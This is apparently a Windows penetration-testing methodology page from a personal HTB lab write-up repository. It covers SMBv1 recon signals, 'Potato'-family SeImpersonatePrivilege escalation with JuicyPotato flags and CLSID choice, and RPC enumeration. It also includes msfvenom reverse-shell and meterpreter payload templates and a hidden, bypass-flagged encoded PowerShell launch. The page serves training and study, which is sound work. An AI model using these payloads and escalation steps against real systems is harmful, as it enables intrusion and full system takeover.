# Methodology — Windows

OS-specific technique ladder, complementing the OS-agnostic workflow in
[`../Methodology.md`](../Methodology.md). Where a technique was exercised on a **retired** HTB box
already written up in this repo, it's cross-linked for full worked detail.

---

## Recon signals worth acting on immediately

- **`smb2-time: Protocol negotiation failed (SMB2)`** — the host doesn't speak SMBv2 at all. This
  is a strong, easy-to-miss signal to check which SMBv1 dialects it supports and run SMB
  vulnerability scripts specifically. See [Legacy](../Machines/Legacy/README.md#-what-i-did-wrong-first-pass).
- **SMBv1 (`NT LM 0.12`) present alongside newer dialects** — run `smb-vuln*` regardless of what
  else is open; SMBv1-capable + unpatched Windows is one of the highest-value single checks.
  See [Blue](../Machines/Blue/README.md#-2-enumeration).
- **`whoami /priv` (or `/all`) immediately after any foothold, before anything else.**
  `SeImpersonatePrivilege` on a service account (IIS app pool, a bundled app server's service
  user, SQL Server service account, etc.) is one of the highest-value findings possible — see the
  Potato-family section below.

---

## `SeImpersonatePrivilege` abuse — the "Potato" family (MITRE T1134.001)

**What it actually is:** abuse of an intentional Windows *privilege*
(`SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`) combined with how DCOM
activation + NTLM reflection interact — **not** a memory-safety bug. This means it's largely
independent of the specific OS patch level: it works wherever the privilege is held, until
Microsoft changes the specific DCOM/NTLM-reflection behavior being abused (this happened starting
Windows 10 1809 / Server 2019, which is why newer "Potato" variants exist to work around each new
mitigation).

**Tool selection depends on the target OS build** — get this wrong and you'll burn time on "not
compatible" errors:

| Observation | Consequence |
|---|---|
| No `combase.dll` present | Rules out GodPotato (`[!] No combase module found`) — GodPotato needs Windows 8+ |
| Pre-Windows 8 target | JuicyPotato is the viable choice (relies on an older, unpatched DCOM activation quirk) |
| Architecture mismatch (x86 vs x64 binary vs OS) | "Not compatible with this version of Windows" — confirm with `wmic os get osarchitecture` *before* picking a build |
| Newer Windows 10/Server 2019+ | Original JuicyPotato is mitigated — look at newer successors (RoguePotato, PrintSpoofer, GodPotato) matched to what the target's mitigation level actually allows |

**CLSID selection:** a BITS CLSID is a reliable default since the BITS service runs as
`LocalSystem` and is present on nearly all Windows builds — but OS-specific CLSID lists exist for
when the default doesn't work.

**Flag reference (JuicyPotato-style tools):**
- `-l` — the tool's own local COM listener port (victim-side plumbing, **not** your reverse-shell port)
- `-c` — CLSID of the privileged DCOM object being baited
- `-p` / `-a` — the program and arguments actually launched as SYSTEM (this has to be something the
  tool can invoke directly: an interpreter + script, or a self-contained EXE — not just any
  arbitrary payload blob)
- `-t *` — try both available process-creation primitives

Full worked examples: [Devel](../Machines/Devel/README.md#-4-privilege-escalation--iis-service-account--system-juicypotato)
(FTP → IIS webroot foothold) and [Arctic](../Machines/Arctic/README.md#-4-privilege-escalation--coldfusion-service-account--system-juicypotato)
(a different web app, same privesc pattern) — the same technique class showing up on two
structurally different boxes is itself a lesson: this is common enough to expect by default on any
Windows web-app service-account foothold.

---

## Era-specific kernel/registry CVEs vs. generic privilege abuse

Old, deliberately-unpatched Windows builds frequently have **both** a Potato-family privilege abuse
available *and* one or more specific, narrow-window kernel or registry-ACL CVEs from that build's
era — these are different bug classes that happen to coexist, not alternative designs of the same
bug:

| | Generic privilege abuse (Potato family) | Era-specific kernel/registry CVE |
|---|---|---|
| Root cause | Intentional privilege + DCOM/NTLM design interaction | A genuine memory-safety or ACL bug in one specific component |
| Patch status | Not "patchable" the same way — mitigated by later Windows/DCOM behavior changes | Fixed once, permanently, by one specific security bulletin |
| Scope | Applies wherever the privilege is held, largely independent of patch level | Only the exact range of builds the bulletin covers |
| Practical takeaway | High-value to master deeply — recurs constantly | Narrow, often a dead end for future boxes once internalized once |

When both are available, the generic technique is usually the better use of study time (it
transfers to the next box); the specific CVE is worth knowing conceptually but rarely worth deep
investment unless you'll realistically face that exact OS generation again. See the Research notes
in [Devel](../Machines/Devel/README.md#-research-notes) and [Arctic](../Machines/Arctic/README.md#-research-notes)
for two fully worked comparisons.

---

## msfvenom payload generation vs. execution — don't conflate the two problems

A frequent source of wasted time: **generating** a payload and **launching** it are two separate
problems, and the right launch method depends entirely on the format chosen.

| Goal | Generation | Execution |
|---|---|---|
| Self-contained web-shell-style payload (e.g. JSP) | `msfvenom -p <stack>/shell_reverse_tcp LHOST=<ip> LPORT=<port> -o shell.<ext>` | Upload it anywhere the app server executes that file type, then just request it — no separate launch step |
| Windows EXE payload | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe` | Run it directly — double-click, from `cmd.exe`, or via a service/scheduled task pointing at it |
| Ready-to-run `.cmd` (no separate interpreter call) | `-f psh-cmd -o shell.cmd` | Run `shell.cmd` directly from `cmd.exe` |
| Raw PowerShell script | `-f psh -o shell.ps1` (or hand-written) | `powershell.exe -nop -ep bypass -f shell.ps1`, or base64: `powershell -nop -w hidden -enc <base64>` |

**Why this matters for Potato-style privesc specifically:** those tools need a concrete *program*
plus its *arguments* (`-p powershell.exe -a "-f script.ps1"`), not a single self-executing binary —
so the payload for that stage is often a hand-written interpreter-invocation one-liner rather than
a fresh msfvenom output. Full walkthrough: [Arctic Research notes](../Machines/Arctic/README.md#-research-notes).

---

## RPC/MSRPC enumeration

`impacket-rpcdump` (or equivalent) against port 135 enumerates every registered RPC endpoint and
its named protocol/interface — useful for fingerprinting installed services (Task Scheduler,
Spooler, SAMR, EventLog, etc.) even when none of them turn out to be the actual entry point. Treat
a long, generic RPC endpoint list as normal Windows service noise unless something in it is
clearly non-default.
